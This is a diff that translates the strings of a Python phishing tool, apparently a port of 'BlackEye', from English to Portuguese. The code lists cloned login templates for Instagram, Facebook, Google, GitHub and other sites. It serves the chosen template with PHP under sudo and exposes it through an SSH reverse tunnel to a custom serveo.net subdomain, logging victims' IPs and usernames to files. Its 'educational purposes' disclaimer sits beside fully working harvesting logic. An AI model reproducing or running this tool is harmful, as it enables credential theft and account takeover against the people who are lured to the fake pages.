@@ -23,22 +23,22 @@ try:
     print(colors.RED + """
                         BlackEye Python
 
-Original Shell Program Created By thelinuxchoice
-Link to Original: https://github.com/thelinuxchoice/blackeye
+Programa Shell Original Criado por thelinuxchoice
+Link para o Original: https://github.com/thelinuxchoice/blackeye
 
-Differences:
-    - This is written in Python
-    - Uses Serveo with A Custom Sub-Domain
+Diferenças:
+    - Isto é escrito em Python
+    - Usa o Serveo com um subdomínio personalizado
 
-                        :: DISCLAIMER ::
+                        :: AVISO! ::
 
-I nor the original developers take any responsibility for actions caused
-by using this program. Any misuse or damage caused by BlackEye is on the
-users behalf. Use for EDUCATIONAL PURPOSES!
+Eu e nem os desenvolvedores originais assumimos qualquer responsabilidade pelas ações
+causadas pelo uso deste programa. Qualquer uso indevido ou dano causado pelo
+Phishing-Python está no nome dos usuários. Use para FINS EDUCACIONAIS!
     """ + colors.END)
 
     print(colors.GREEN + """
-                       Availble Templates
+                       Modelos disponíveis:
 
 [1] Instagram          [2] Facebook            [3] Snapchat
 [4] Twitter            [5] GitHub              [6] Google
@@ -52,7 +52,7 @@ users behalf. Use for EDUCATIONAL PURPOSES!
 [28] MySpace           [29] Badoo              [30] VK
 [31] Yandex            [32] devianART          [33] Custom
 
-Please Choose A Number To Host Template:
+Por favor, escolha um número para o modelo de host:
     """ + colors.END)
     templates = {
     '1': 'instagram',
@@ -91,16 +91,16 @@ Please Choose A Number To Host Template:
     }
     number = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
     if number == "18":
-        print("Ebay Currently Does Not Work. Choose Another..")
+        print("Ebay atualmente não funciona. Escolha Outro..")
         exit()
     else:
         pass
     choice = templates[number]
-    print("Loading %s" % (choice))
-    print("\nEnter A Custom Subdomain")
+    print("Carregando %s" % (choice))
+    print("\nInsira um subdomínio personalizado")
     subdom = input(colors.YELLOW + "[" + colors.END + "?" + colors.YELLOW + "]" + colors.END + "> ")
-    print(colors.GREEN + "Starting Server at %s.serveo.net..." % (subdom))
-    print("Logs Can Be Found In sites/%s/ip.txt and sites/%s/usernames.txt" % (choice, choice) + colors.END)
+    print(colors.GREEN + "Iniciando o servidor no %s.serveo.net..." % (subdom))
+    print("Os logs podem ser encontrados em sites/%s/ip.txt e sites/%s/usernames.txt" % (choice, choice) + colors.END)
     cmd_line = "sudo php -t sites/%s -S 127.0.0.1:80 & ssh -R %s.serveo.net:80:127.0.0.1:80 serveo.net" % (choice, subdom)
     p = subprocess.Popen(cmd_line, shell=True)
     out = p.communicate()[0]
